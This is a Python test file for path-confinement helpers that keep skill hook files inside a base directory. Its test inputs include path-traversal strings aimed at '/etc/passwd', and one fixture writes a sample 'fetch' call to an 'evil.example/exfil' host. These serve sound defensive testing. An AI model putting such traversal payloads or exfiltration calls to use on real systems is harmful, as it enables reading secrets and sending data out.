"""Ported from src/evolveguard/paths.test.ts."""
import os

import pytest

from evolveguard.errors import EvolveGuardError
from evolveguard.paths import resolve_cli_path, resolve_within_base


class TestResolveWithinBase:
    def test_resolves_relative_path_nested_inside_base(self):
        result = resolve_within_base("/skills/my-skill", "hooks/pre.sh")
        assert result == os.path.abspath("/skills/my-skill/hooks/pre.sh")

    def test_rejects_path_that_traverses_outside_base(self):
        with pytest.raises(EvolveGuardError):
            resolve_within_base("/skills/my-skill", "../../etc/passwd")

    def test_rejects_absolute_path_outside_base(self):
        with pytest.raises(EvolveGuardError):
            resolve_within_base("/skills/my-skill", "/etc/passwd")

    def test_allows_base_directory_itself(self):
        result = resolve_within_base("/skills/my-skill", ".")
        assert result == os.path.abspath("/skills/my-skill")

    def test_rejects_symlink_pointing_outside_base(self, tmp_path):
        skill_dir = tmp_path / "skill" / "hooks"
        skill_dir.mkdir(parents=True)
        outside_file = tmp_path / "outside-secret.txt"
        outside_file.write_text('fetch("https://evil.example/exfil")\n')
        os.symlink(str(outside_file), str(skill_dir / "pre.sh"))

        with pytest.raises(EvolveGuardError):
            resolve_within_base(str(tmp_path / "skill"), "hooks/pre.sh")

    def test_allows_symlink_that_stays_inside_base(self, tmp_path):
        skill_dir = tmp_path / "skill"
        (skill_dir / "hooks").mkdir(parents=True)
        inside_file = skill_dir / "real.sh"
        inside_file.write_text("#!/bin/sh\necho ok\n")
        os.symlink(str(inside_file), str(skill_dir / "hooks" / "pre.sh"))

        result = resolve_within_base(str(skill_dir), "hooks/pre.sh")
        assert result == os.path.abspath(str(skill_dir / "hooks" / "pre.sh"))

    def test_no_error_on_nonexistent_path(self):
        result = resolve_within_base("/skills/my-skill", "hooks/not-created-yet.sh")
        assert result == os.path.abspath("/skills/my-skill/hooks/not-created-yet.sh")


class TestResolveCliPath:
    def test_resolves_relative_path_against_cwd(self):
        assert resolve_cli_path("/a/b", "c.json") == os.path.abspath("/a/b/c.json")
